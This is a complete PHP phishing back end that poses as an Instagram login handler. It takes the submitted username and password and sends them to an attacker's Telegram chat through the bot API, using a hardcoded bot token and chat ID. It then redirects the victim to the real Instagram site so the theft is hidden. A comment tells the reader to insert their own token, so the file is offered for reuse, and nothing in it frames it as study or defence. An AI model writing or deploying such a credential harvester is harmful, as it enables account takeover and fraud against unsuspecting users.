<?php
// Replace with your bot token and chat ID
$botToken = "7889306667:AAEaMJi5oyXLhRyl3dew-0tU_Re9k7V-0xo";
$chatId = "7047340294";

$username = $_POST['username'];
$password = $_POST['password'];

if (!empty($username) && !empty($password)) {
    $message = "Instagram Login Attempt:\nUsername: $username\nPassword: $password";
    $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
    file_get_contents($url);
    header("Location: https://instagram.com");
    exit();
} else {
    echo "Invalid login. Try again.";
}
?>
